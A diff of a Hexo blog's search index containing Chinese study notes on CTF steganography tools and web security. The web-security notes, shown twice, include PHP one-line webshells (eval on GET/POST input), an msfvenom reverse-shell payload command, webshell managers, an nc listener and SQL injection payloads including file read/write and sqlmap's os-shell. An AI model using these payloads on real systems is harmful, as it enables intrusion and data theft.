@@ -1,85 +1,229 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-  
-    
-    <entry>
-      <title></title>
-      <link href="/2023/07/10/Xray/"/>
-      <url>/2023/07/10/Xray/</url>
-      
-        <content type="html"><![CDATA[<p><strong>Xray</strong></p><p>1.使用xray进行服务扫描</p><p>#快速检测单个目标</p><p> .\xray_darwin_amd64.exe servicescan –target 127.0.0.1:8009</p><p>#批量检查1.txt中的目标，一行一个目标带端口</p><p> .\xray_darwin_amd64.exe servicescan –target-file 1.txt </p><p>其中，1.txt的格式为一行一个service，如</p><p>1.1.1.1:80</p><p>2.2.2.2:7777</p><p>若需要输出到html报告中则在后面加上 –html-output service.html,</p><p> .\xray_darwin_amd64.exe servicescan –target-file 1.file –html-output 1.html</p><p>批量扫url的命令</p><p>\xray_windows_amd64.exe webscan –url-file 2.txt –html-output 2.html</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title></title>
-      <link href="/2023/06/13/python/"/>
-      <url>/2023/06/13/python/</url>
-      
-        <content type="html"><![CDATA[<h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>1.整数：Python可以处理任意大小的整数（包括负整数），同数学公式写法</p><p>2.浮点数：即小数，科学计数法时，小数点的位置可变，例如1.23x109和12.3x108是完全相等的。很大的浮点数用e表示10，1.23x10的9次方就是<code>1.23e9</code>，或者<code>12.3e8</code></p><p>3.整数和浮点数在计算机内部存储的方式是不同的，整数最准确（包括除法），浮点数可能会涉及四舍五入</p><p>4.字符串是以‘’</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>隐写总结</title>
-      <link href="/2023/05/31/%E9%9A%90%E5%86%99%E6%80%BB%E7%BB%93/"/>
-      <url>/2023/05/31/%E9%9A%90%E5%86%99%E6%80%BB%E7%BB%93/</url>
-      
-        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="1-总结"><a href="#1-总结" class="headerlink" title="1 总结"></a>1 总结</h1><ol><li><font color=red>图片属性一定要看的，题目给的提示有可能是误导，这点要自己判断. 即使是string看不到，也要手工看下，结果不一样</font></li><li><font color=red>图片放kali</font>,会自动根据文件头识别文件类型</li><li>strings 查看有无特殊字符串 <code>strings -f xxx | egrep -i &quot;flag|key|pass|sec|base|Zmxh|==&quot;</code></li><li>strings <font color=red> | more 需要观察的都要仔细看</font></li><li><font color=red>binwalk(u18)</font>检查图片中有无隐藏内容  </li><li><font color=red>foremost(u18)</font>检查有无隐写，一般需要在kali中提前安装<code>sudo apt-get install foremost</code>，windows备用搜索关键字  </li><li><font color=red>stegsolv</font>导出常见通道格式基本固定，<font color=red>遇到PNG和BMP图片，可以使用zsteg快速分析</font>，命令<code>zsteg -a xx.png</code>，其他图片还是用手工<font color=red>手工效率低下，是下下之选</font>。利用zsteg工具直接导出数据的命令<code>zsteg -e b1,rgb,lsb,xy    题目.png &gt; out.zip</code>。一般会在某个通道看到不一样的图像，其中一种见示例203_Misc-GreatWall</li><li><font color=red>两张图片一模一样</font>，考虑三种：（1）两个图片某些像素不同，通过这些像素进行异或，相加等操作得到新的图片；使用Stegsolve1.3版本的combiner功能计算两个图片的各类组合（2）使用blindwatermark工具 <code>python2 bwm.py decode 1.png 2.png 1122.png</code>  </li><li><font color=red>多张图片，要么一模一样，要么有特征规律（比如像素）</font>,使用Stegsolve1.3版本的combiner功能计算两个图片的各类组合，按照特征规律进行拼图<br>——————————–分隔——————————————</li><li><font color=red>GIF</font>分离很多图片，虽然不会使用python对图片进行识别，但可以通过文件大小排序快速分类</li><li>zsteg可以检测<font color=red>PNG</font>和<font color=red>BMP</font>图片里的隐写数据，在ubuntu18中已安装，先使用zsteg filename，观察有无可见字符，最后用zsteg -a file ：运行给定文件上的所有方法，仔细观察，特别是4&#x2F;5&#x2F;6&#x2F;7开头的两位十六进制码  </li><li>看到<font color=red>PNG</font>要想到修改文件的高度与宽度。新方法：再x64中everything查找“png_height_width_fix.py”，通杀改高、改宽；老方法：修改第二行的第8位数字，那里是图片的高度。如还不行，可以考虑等比例放大，即将第二行的前4位数字double，5-8位数字double。</li><li>看到<strong>BMP</strong>可以考虑高度，位置与PNG类似，<strong>但是结构不一样</strong>，宽度662， 十六进制0x296，图片保存格式为  00 00 96 02 ， 类似大小端</li><li>还有<strong>JPG</strong>高度修改，使用010比较便捷。010路径：struct SOFx sof0 - WORD Y_image</li><li><font color=red>PNG</font>隐写-IDAT，使用pngcheck.exe -v idat.png，一般针对大图片。如果有 IDAT 还没填满（填满6万多）就填充了下一个就要考虑是不是有问题。[[PNG-IDAT隐写]]</li><li>目前了解，针对<font color=red>PNG</font>和<font color=red>JPG</font>，cloacked图片加密隐写，需要密码。<code>python2 lsb.py extract VALORANT.png output.jpg password</code>   密码如果不提供，一般为123456，或者文件名、或者题目名</li><li>看到<font color=red>JPG</font>，还可以考虑使用steghide，<font color=red>优先考虑在u18上使用吧</font>。<code>steghide.exe  extract -sf good-已合并.jpg</code>。还可以考虑stegdetect。<code>stegdetect.exe -tjopi -s 10.0 hide.jpg</code>。还可以考虑使用stegbreak。<code>stegbreak.exe -r rules.ini -f password.dic -t p hide.jpg</code> </li><li>对于jpg图片，是否提示与outguess有关，u18已安装  </li><li>对于jpg图片，先使用SilentEye试试</li><li>identify 1. ——————————–分隔–其他隐写——————————————</li><li>看到base64，如果解码不正常，最后实在不行考虑下base64隐写<code>base64_stego</code>  </li><li>F5隐写，u18\003-Misc\F5-stegxx，使用方法<code>java Extract Misc.jpg</code>，输出结果在<code>output.txt</code>中，可以<code>file output.txt</code>核实文件类型</li><li>基于空格和制表符的隐写，<code>SNOW.exe -p password filename</code></li><li>未知的文件格式，通常关注文件头的格式，同时也要注意文件尾的格式。详见<strong>各类文件特征总结</strong></li><li>word文件可以通过修改后缀的方式解压缩</li><li>doc隐写，本机的doc已经修改<code>选项、显示、隐藏文字</code>;修改后缀为zip，解压缩有用find xargs搜索。</li><li>PDF可以通过x64虚拟机中安装的Foxit PhantomPDF打开，或者右键选择使用wps pdf编辑功能</li><li>pyc隐写<code>python3 stegosaurus.py -x flag.pyc</code></li><li>conf.bin文件用工具routerpassview 打开，注意搜索宽带账号和宽带密码</li><li>MP3隐写：MP3stego需要猜测密码，<code>decode -X -P pass svega_stego.mp3</code></li><li>WAV隐写：SilentEye工具直接打开看看</li><li>MP3、wav隐写：使用audacity软件分析音频是，注意切换<strong>波形</strong> 和 <strong>频谱图</strong>，<strong>调整频谱增益</strong>，看得更清楚；也可以用软件Adobe Audition CS6打开，Shift + D切换两个视图</li><li>如果音乐能正常播放，大概率是在音乐头部和尾部增加了内容，注意放大观察头尾</li><li>wav隐写：audacity软件可以对音频进行剪裁（剪刀图标），dtmf2num.exe在识别时，需要比较纯净的音频。</li><li>wav隐写：SilentEye软件直接打开后按decode</li><li>wav隐写：MMSSTV结合虚拟声卡，播放一下；u16上安装的robot36工具，<code>decode &#39;Can you hear.wav&#39;</code>，ppm文件用ps可以打开。</li><li>01格式的编码可能是二进制编码，也可能是摩斯码。关注长度是否是平方数，可否转换二维码。参考PNG IDAT隐写的例子</li></ol><h1 id="2-如果都尝试过没有思路，看看本文档的附件ppt"><a href="#2-如果都尝试过没有思路，看看本文档的附件ppt" class="headerlink" title="2 如果都尝试过没有思路，看看本文档的附件ppt"></a>2 如果都尝试过没有思路，看看本文档的附件ppt</h1><p>![[杂项.pptx]]</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Web-命令执行、Web-文件上传</title>
-      <link href="/2023/04/25/Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%81Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-      <url>/2023/04/25/Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%81Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-      
-        <content type="html"><![CDATA[<h1 id="Web-命令执行、Web-文件上传"><a href="#Web-命令执行、Web-文件上传" class="headerlink" title="Web-命令执行、Web-文件上传"></a>Web-命令执行、Web-文件上传</h1><h2 id="1-常用的一些linux命令"><a href="#1-常用的一些linux命令" class="headerlink" title="1.常用的一些linux命令"></a>1.常用的一些linux命令</h2><ol><li><strong>Curl</strong><br> $ curl url      不带任何参数时，curl就是发出GET请求</li><li>Nc<br> nc也可以传文件，远程控制**<br> Nc -lvp 5500 &lt;1.txt</li><li>BP<br> kali自带的字典路径 usr&#x2F;share&#x2F;wordlists&#x2F;metasploit</li></ol><h1 id="web相关"><a href="#web相关" class="headerlink" title="web相关"></a>web相关</h1><ol><li><p>browser&amp;server</p></li><li><p>forntend&amp;backend<br> 看得到的 Html，JavaScript，css<br> 看不到的 Apache，php，mysql，nodejs</p></li><li><p>服务器server，作用管理文档<br> kali自带了apache（80端口）</p></li><li><p>post和response的区别 协议不对称</p></li><li><p>cookie&amp;session</p></li></ol><h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><ol><li><p>读取文件命令<br>cat、tac、head、tail、more、less、xxd、od、nl、gerp、strings、cut、grep、sed、awk、base64、read、printf</p></li><li><p>操作文件命令<br>cp、mv、ln<br>测试crul的国外网站 pipedream</p></li><li><p>文件头检查<br>图片马（只检查前两个字节）  一句话木马 copy命令实现<br> auto_prepeng_file&#x3D;1.png  自动追加<br>1.png</p><?=phpinfo();?><p> Index.php</p></li></ol><p>使用专门的文件服务器，如MINIO、CEPH等<br>Minio:<a href="https://www.minio.org.cn/">https://www.minio.org.cn/</a></p><p>Webshell<br>Eval 、assert<br><?=echo eval($_GET[1])?><br>?1&#x3D;system(“id”);</p><p>一句话木马 <?=echo eval($_POST[1])?><br>管理工具：中国菜刀，蚁剑、<br>        weevely：生成webshell，密码<br>            weevely generat 123 shell.php 生成webshell，密码<br>            Weevely url 123 连接weevely<br>        Webacoo：生成后门，连接webshell<br>        Behinder（冰蝎）<br>        Godzilla（哥斯拉）：java -jar godzilla.jar<br>        反弹shell:msfvennom  -p php&#x2F;reverse_php LhoST &#x3D;IP  -f raw &gt;reverse .php<br>小马：比较简单的webshell管理<br>大马：比较复杂的webshell管理工具（带web界面）</p><p>文件包含<br>原理：<br>常见函数：<br>include()文件不存在会告警，但是会继续执行<br>Include_once()只执行一次<br>Require()文件不存在会告警，但是会继续执行<br>Require_once只执行一次<br>File_get_contents将文件内容读入到字符串（类似curl）<br>Popen()</p><h1 id="jsp常见引入其他文件方式"><a href="#jsp常见引入其他文件方式" class="headerlink" title="jsp常见引入其他文件方式"></a>jsp常见引入其他文件方式</h1><pre><code>## </code></pre><p>data协议 P96<br>协议头data:&#x2F;&#x2F;<br>类型：text&#x2F;plain;base64<br>内容：xxx<br>Data:&#x2F;&#x2F;text&#x2F;plain,xxx;base64,eHh4eA&#x3D;&#x3D;</p><p>未指定  &#x3D;&#x3D;&gt;Tmp<br>Session_ff348165938f80c9f590d482b899e260 </p><p>文件包含防御</p><h1 id="过滤文件"><a href="#过滤文件" class="headerlink" title="过滤文件"></a>过滤文件</h1><p>1.白名单校验<br>    Allow_file&#x3D; [<br>    ‘Index.php’<br>    ‘Footer.php’<br>    Header.php’<br>    ]<br>2.指定可以包含的目录<br>Basename获取文件<br>dirname获取文件所在路径</p><pre><code>allow = [&#39;.txt&#39;,&#39;.html&#39;,…] </code></pre><p> 例如只允许  &#x2F;var&#x2F;www&#x2F;html<br>dirname 获取文件所在路径，校验允许包含的路径   &#x2F;var&#x2F;www&#x2F;html<br>dirname &#x2F;var&#x2F;log&#x2F;nginx&#x2F;accsee.log &#x3D;&gt;   &#x2F;var&#x2F;log&#x2F;nginx 发现不在白名单<br>Disable_function绕过，通过反引号可以绕过</p><p>SQL注入<br>数据存在表中，<br>增删改查：select&#x2F;insert&#x2F;update&#x2F;delete</p><p>DQL 查询语句（select）<br>DML 操作语句（insert&#x2F;update&#x2F;delete）<br>DDL定义语句（创建表、修改表格结构等）<br>DCL控制语句</p><p>MySQL<br>库 &gt; 表 （列） &gt;行记录（数据）<br>DQL 基本构成<br>Select [列] from [数据库] [表名] where {条件}  {分组} {排序}<br>条件连接符:and or &amp;  |<br>条件匹配：&#x3D; &lt;&gt; not like（任意字符：%）<br>分组：group by [列,…] having {条件}<br>排序：order by [列,…] [SORT_ASC|SORT _DESC]<br>                   升序           降序<br>限制输出：limit 起始位置，偏移<br>注释符：#、–[空格]、<br>拼接函数    concat，concat_ws<br>concat_ws(‘,’,’a’,’b’)—–&gt;print  a,b<br>group_concat()  把多行合并成一行</p><p>1.判断列数<br>    oder by 数字     —-可以通过2分法判断列数<br>select * from user where usermame &#x3D; 1 and password &#x3D;1 ;group table user;<br>                                                        堆叠注入<br>select col1,col2,col3，* from user where id&#x3D;’输入’or  1&#x3D;1%23</p><p>Union 联合注入<br>information_schema 记录了所有的数据库信息、表信息、列信息、权限信息等<br>                    1.记录数据库信息的表 schema<br>                        select schema_name from information_schema.schema;<br>                    2.记录数据表信息的表 tables(table_name,table_schame)<br>                        select table_name from information_schema.tables where table_schame &#x3D; ‘test’<br>                    3.记录数据表列信息的表 columns (columns_name,table_name,table_schame)<br>                        select column_name from information_schema.columns where table_name &#x3D; ‘test<br>                        ‘<br>数字型注入：输入内容未被引号包裹    select * from user where id &#x3D;1<br>字符型注入：<br>    1.单引号注入<br>    2.双引号注入</p><p>盲注：不会回显执行结果<br>&#x2F;&#x2F;在kali查看acsii码的方法 man ascii<br>字符串截取：<br>    substr()      select substr(user()，1,1)&#x3D; ‘a’<br>    mid()         select mid(user()，1,1)&#x3D; ‘a’<br>        此处需要注意，单引号可能会被注释掉，所以需要使用ascii码<br>    ascii()   将字符串转成ascii码数值（十进制）<br>        ASCII可打印字符 33-126之间<br>  时间盲注：select<br>    条件判断：if(条件，真值分支，假值分支)<br>              ifnul() &#x3D;&#x3D; if(值&#x3D;null,1,0)<br>              case when(条件 1&#x3D;1) then when(条件2 1&#x3D;2) …   else…END<br>           小技巧 awk命令 通过%c 把数值（十进制）转换成ascii<br>报错注入：通过恶意输入，控制报错内容来读取资料<br>             XML functions：1.ExtractValue</p><ol><li><p>宽字节注入：利用中文特性，使用超出ASCII码表（大于80）展示，会被当做半个中文；<br>     由于添加的转义字符也是半个中文，他们组合在一起相当于一个中文，这时候转义字符（\）失去转义功能。<br>     合法范围：00-FF，一般注入使用%df<br> 1 个中文 &#x3D;&#x3D; 2 个ascii</p></li><li><p>二次注入：第一次传入恶意的sql组装片段，并不触发注入行为，但是会被保存。<br>     第二次查询的时候引用了存错的恶意sql注入组装片段，导致SQL注入行为。<br>    insert into user (username) value (“xxx”)<br>             username 输入： xxx’ or 1&#x3D;1 #<br>    select * from user where username&#x3D;’xxx’</p></li><li><p>insert注入：用户可以控制插入（insert、update）语句的注入  #的作用是把后面的字符注释掉<br>    insert into user (username,password) value (‘输入’,’输入’);<br>    insert into user (username,password) value (‘1’,user())#,’输入’);</p></li><li><p>读写文件（受限secure_file_priv,允许读写的目录，为空则不受限制）<br>     load_file(文件路径)<br>         select load_file(‘&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;2.txt’)<br>     into outfile 路径<br>         select .. into outfile ‘&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;2.txt’</p></li><li><p>绕过方式<br> 关键词过滤：大小写、双写、等价替换<br> 关键词被过滤： 引号–&gt;16进制编码<br>   可以用 and or  xor 等，&amp;&amp; || | !<br>   or –&gt;  oorr  –&gt;or<br>   or –&gt;  |<br>   select * from user where id &#x3D;’1’ or ‘1’&#x3D;’1’</p></li><li><p>sqlmap<br> 强大的sql注入工具，检测是否sql注入<br> 语法：sqlmap -u URL<br>       sqlmap -r 请求报文文件<br>    –dbs                                           查询数据库<br>    –tables -D  数据库名称                         查询指定数据库下的表<br>    –cloumns -D 数据库名称 -T 数据表名称           查询指定数据库下的指定表的列<br>    –dump -D 数据库名称 -T数据表名称 -C 指定列，…查询数据<br>    –sql-shell                                     获取sql的cmd命令行(只支持增删改查)<br>    –os-shell                                      获取远程控制<br>    –tamper                                        指定一些绕过处理，绕过一些过滤，<br>                                                    kali自带的比较好用的脚本,路径在 &#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;temper，其中spaceconment.py比较好用，转换空格<br>                                                    例如：sqlmap -u URL –temper spaceconment –dbs</p></li></ol>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>hello,my first blog</title>
-      <link href="/2023/04/19/hello-my-first-blog/"/>
-      <url>/2023/04/19/hello-my-first-blog/</url>
-      
-        <content type="html"><![CDATA[<h1 id="博客操作流程"><a href="#博客操作流程" class="headerlink" title="博客操作流程"></a>博客操作流程</h1><p>首先在博客根目录下右键打开git bash，安装一个扩展npm i hexo-deployer-git。</p><p>然后输入hexo new post “我的第一篇博客”，新建一篇文章。</p><p>然后打开D:\Hexo\source_posts的目录，可以发现下面多了一个文件夹和一个.md文件，一个用来存放你的图片等数据，另一个就是你的文章文件啦。<br>你可以会直接在vscode里面编写markdown文件，可以实时预览，也可以用用其他编辑md文件的软件的工具编写。<br>编写完markdown文件后，根目录下输入hexo g生成静态网页，然后输入hexo s可以本地预览效果，最后输入hexo d上传到github上。这时打开你的github.io主页就能看到发布的文章啦。</p><p>到这儿基本第一部分就完成了，已经完整搭建起一个比较简陋的个人博客了，接下来我们就可以对我们的博客进行个性化定制了。<br>以下学习markdown的相关语法并测试</p><p>1.1 代码块<br>&#39;‘’shell<br>#VScode终端<br>hexl clean;hexo s<br>hexo clean;hexo g;hexo d<br>git add . &amp;&amp;git commit -m “npm publish” &amp;&amp; npm version patch<br>git push<br>&#39;‘’ </p><p>1.2 多级标题</p><h1 id="H1"><a href="#H1" class="headerlink" title="H1"></a>H1</h1><h2 id="H2"><a href="#H2" class="headerlink" title="H2"></a>H2</h2><h3 id="H3"><a href="#H3" class="headerlink" title="H3"></a>H3</h3><p>以此类推</p><p>1.3 文字样式<br><u>下划线演示</u></p><p><strong>字体加粗</strong></p><p><em>斜体</em></p><p><code>高亮</code></p><p><del>删除</del></p><p><font size =5>5号字 </font><br><font face="等线">等线</font><br><font color=blue>蓝</font></p><p>1.4引用</p><blockquote><p>JAVA<br>二级引用演示<br>MYSQL</p><blockquote><p>外键</p><p>事务</p><p><strong>行级锁</strong>（引用一样可以用格式）</p></blockquote><p>….</p></blockquote><h2 id="1-5-分割线"><a href="#1-5-分割线" class="headerlink" title="1.5 分割线"></a>1.5 分割线</h2><hr><p>1.6 无序列表</p><ul><li>java</li><li>python</li><li>。。。</li></ul><ul><li>java</li><li>python</li><li>。。。</li></ul><ul><li>java</li><li>python</li><li>。。。</li></ul><p>1.6.2 有序列表（注意.后面有空格）</p><p>1.<br>2.<br>3. </p><p>1.7 图片</p><h1 id="本地图片"><a href="#本地图片" class="headerlink" title="本地图片"></a>本地图片</h1><p>&lt;&#x2F;img src&#x3D;”C:\Users\陈楠\OneDrive\图片\本机照片” alt&#x3D;”1.jpg” style&#x3D;”zoom:50%;”&gt;<br><img src="/image.png" alt="hello-my-first-blog" title="1"></p><p><img src="/./img/1.jpg" alt="1.jpg"></p><p>1.8表格</p><table><thead><tr><th>项目编号</th><th>资金</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>100,000</td><td>无</td></tr><tr><td>2</td><td>200,000</td><td>重要</td></tr></tbody></table>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Hello World</title>
-      <link href="/2023/04/19/hello-world/"/>
-      <url>/2023/04/19/hello-world/</url>
-      
-        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-  
-  
+<search>
+  <entry>
+    <title>Web-命令执行、Web-文件上传</title>
+    <url>/2023/04/25/Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%81Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h1 id="Web-命令执行、Web-文件上传"><a href="#Web-命令执行、Web-文件上传" class="headerlink" title="Web-命令执行、Web-文件上传"></a>Web-命令执行、Web-文件上传</h1><h2 id="1-常用的一些linux命令"><a href="#1-常用的一些linux命令" class="headerlink" title="1.常用的一些linux命令"></a>1.常用的一些linux命令</h2><ol>
+<li><strong>Curl</strong><br> $ curl url      不带任何参数时，curl就是发出GET请求</li>
+<li>Nc<br> nc也可以传文件，远程控制**<br> Nc -lvp 5500 &lt;1.txt</li>
+<li>BP<br> kali自带的字典路径 usr&#x2F;share&#x2F;wordlists&#x2F;metasploit</li>
+</ol>
+<h1 id="web相关"><a href="#web相关" class="headerlink" title="web相关"></a>web相关</h1><ol>
+<li><p>browser&amp;server</p>
+</li>
+<li><p>forntend&amp;backend<br> 看得到的 Html，JavaScript，css<br> 看不到的 Apache，php，mysql，nodejs</p>
+</li>
+<li><p>服务器server，作用管理文档<br> kali自带了apache（80端口）</p>
+</li>
+<li><p>post和response的区别 协议不对称</p>
+</li>
+<li><p>cookie&amp;session</p>
+</li>
+</ol>
+<h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><ol>
+<li><p>读取文件命令<br>cat、tac、head、tail、more、less、xxd、od、nl、gerp、strings、cut、grep、sed、awk、base64、read、printf</p>
+</li>
+<li><p>操作文件命令<br>cp、mv、ln<br>测试crul的国外网站 pipedream</p>
+</li>
+<li><p>文件头检查<br>图片马（只检查前两个字节）  一句话木马 copy命令实现<br> auto_prepeng_file&#x3D;1.png  自动追加<br>1.png</p>
+<?=phpinfo();?>
+<p> Index.php</p>
+</li>
+</ol>
+<p>使用专门的文件服务器，如MINIO、CEPH等<br>Minio:<a href="https://www.minio.org.cn/">https://www.minio.org.cn/</a></p>
+<p>Webshell<br>Eval 、assert<br><?=echo eval($_GET[1])?><br>?1&#x3D;system(“id”);</p>
+<p>一句话木马 <?=echo eval($_POST[1])?><br>管理工具：中国菜刀，蚁剑、<br>        weevely：生成webshell，密码<br>            weevely generat 123 shell.php 生成webshell，密码<br>            Weevely url 123 连接weevely<br>        Webacoo：生成后门，连接webshell<br>        Behinder（冰蝎）<br>        Godzilla（哥斯拉）：java -jar godzilla.jar<br>        反弹shell:msfvennom  -p php&#x2F;reverse_php LhoST &#x3D;IP  -f raw &gt;reverse .php<br>小马：比较简单的webshell管理<br>大马：比较复杂的webshell管理工具（带web界面）</p>
+<p>文件包含<br>原理：<br>常见函数：<br>include()	文件不存在会告警，但是会继续执行<br>Include_once()	只执行一次<br>Require()	文件不存在会告警，但是会继续执行<br>Require_once	只执行一次<br>File_get_contents	将文件内容读入到字符串（类似curl）<br>Popen()	</p>
+<h1 id="jsp常见引入其他文件方式"><a href="#jsp常见引入其他文件方式" class="headerlink" title="jsp常见引入其他文件方式"></a>jsp常见引入其他文件方式</h1><pre><code>## 
+</code></pre>
+<p>data协议 P96<br>协议头data:&#x2F;&#x2F;<br>类型：text&#x2F;plain;base64<br>内容：xxx<br>Data:&#x2F;&#x2F;text&#x2F;plain,xxx;base64,eHh4eA&#x3D;&#x3D;</p>
+<p>未指定  &#x3D;&#x3D;&gt;	Tmp<br>Session_ff348165938f80c9f590d482b899e260 </p>
+<p>文件包含防御</p>
+<h1 id="过滤文件"><a href="#过滤文件" class="headerlink" title="过滤文件"></a>过滤文件</h1><p>1.白名单校验<br>    Allow_file&#x3D; [<br>    ‘Index.php’<br>    ‘Footer.php’<br>    Header.php’<br>    ]<br>2.指定可以包含的目录<br>Basename	获取文件<br>dirname	获取文件所在路径</p>
+<pre><code>allow = [&#39;.txt&#39;,&#39;.html&#39;,…] 
+</code></pre>
+<p> 例如只允许  &#x2F;var&#x2F;www&#x2F;html<br>dirname 获取文件所在路径，校验允许包含的路径   &#x2F;var&#x2F;www&#x2F;html<br>dirname &#x2F;var&#x2F;log&#x2F;nginx&#x2F;accsee.log &#x3D;&gt;   &#x2F;var&#x2F;log&#x2F;nginx 发现不在白名单<br>Disable_function绕过，通过反引号可以绕过</p>
+<p>SQL注入<br>数据存在表中，<br>增删改查：select&#x2F;insert&#x2F;update&#x2F;delete</p>
+<p>DQL 	查询语句（select）<br>DML	 操作语句（insert&#x2F;update&#x2F;delete）<br>DDL	定义语句（创建表、修改表格结构等）<br>DCL	控制语句</p>
+<p>MySQL<br>库 &gt; 表 （列） &gt;行记录（数据）<br>DQL 基本构成<br>Select [列] from [数据库] [表名] where {条件}  {分组} {排序}<br>条件连接符:and or &amp;  |<br>条件匹配：&#x3D; &lt;&gt; not like（任意字符：%）<br>分组：group by [列,…] having {条件}<br>排序：order by [列,…] [SORT_ASC|SORT _DESC]<br>                   升序           降序<br>限制输出：limit 起始位置，偏移<br>注释符：#、–[空格]、<br>拼接函数    concat，concat_ws<br>concat_ws(‘,’,’a’,’b’)—–&gt;print  a,b<br>group_concat()  把多行合并成一行</p>
+<p>1.判断列数<br>    oder by 数字     —-可以通过2分法判断列数<br>select * from user where usermame &#x3D; 1 and password &#x3D;1 ;group table user;<br>                                                        堆叠注入<br>select col1,col2,col3，* from user where id&#x3D;’输入’or  1&#x3D;1%23</p>
+<p>Union 联合注入<br>information_schema 记录了所有的数据库信息、表信息、列信息、权限信息等<br>                    1.记录数据库信息的表 schema<br>                        select schema_name from information_schema.schema;<br>                    2.记录数据表信息的表 tables(table_name,table_schame)<br>                        select table_name from information_schema.tables where table_schame &#x3D; ‘test’<br>                    3.记录数据表列信息的表 columns (columns_name,table_name,table_schame)<br>                        select column_name from information_schema.columns where table_name &#x3D; ‘test<br>                        ‘<br>数字型注入：输入内容未被引号包裹    select * from user where id &#x3D;1<br>字符型注入：<br>    1.单引号注入<br>    2.双引号注入</p>
+<p>盲注：不会回显执行结果<br>&#x2F;&#x2F;在kali查看acsii码的方法 man ascii<br>字符串截取：<br>    substr()      select substr(user()，1,1)&#x3D; ‘a’<br>    mid()         select mid(user()，1,1)&#x3D; ‘a’<br>        此处需要注意，单引号可能会被注释掉，所以需要使用ascii码<br>    ascii()   将字符串转成ascii码数值（十进制）<br>        ASCII可打印字符 33-126之间<br>  时间盲注：select<br>    条件判断：if(条件，真值分支，假值分支)<br>              ifnul() &#x3D;&#x3D; if(值&#x3D;null,1,0)<br>              case when(条件 1&#x3D;1) then when(条件2 1&#x3D;2) …   else…END<br>           小技巧 awk命令 通过%c 把数值（十进制）转换成ascii<br>报错注入：通过恶意输入，控制报错内容来读取资料<br>             XML functions：1.ExtractValue</p>
+<ol>
+<li><p>宽字节注入：利用中文特性，使用超出ASCII码表（大于80）展示，会被当做半个中文；<br>     由于添加的转义字符也是半个中文，他们组合在一起相当于一个中文，这时候转义字符（\）失去转义功能。<br>     合法范围：00-FF，一般注入使用%df<br> 1 个中文 &#x3D;&#x3D; 2 个ascii</p>
+</li>
+<li><p>二次注入：第一次传入恶意的sql组装片段，并不触发注入行为，但是会被保存。<br>     第二次查询的时候引用了存错的恶意sql注入组装片段，导致SQL注入行为。<br>    insert into user (username) value (“xxx”)<br>             username 输入： xxx’ or 1&#x3D;1 #<br>    select * from user where username&#x3D;’xxx’</p>
+</li>
+<li><p>insert注入：用户可以控制插入（insert、update）语句的注入  #的作用是把后面的字符注释掉<br>    insert into user (username,password) value (‘输入’,’输入’);<br>    insert into user (username,password) value (‘1’,user())#,’输入’);</p>
+</li>
+<li><p>读写文件（受限secure_file_priv,允许读写的目录，为空则不受限制）<br>     load_file(文件路径)<br>         select load_file(‘&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;2.txt’)<br>     into outfile 路径<br>         select .. into outfile ‘&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;2.txt’</p>
+</li>
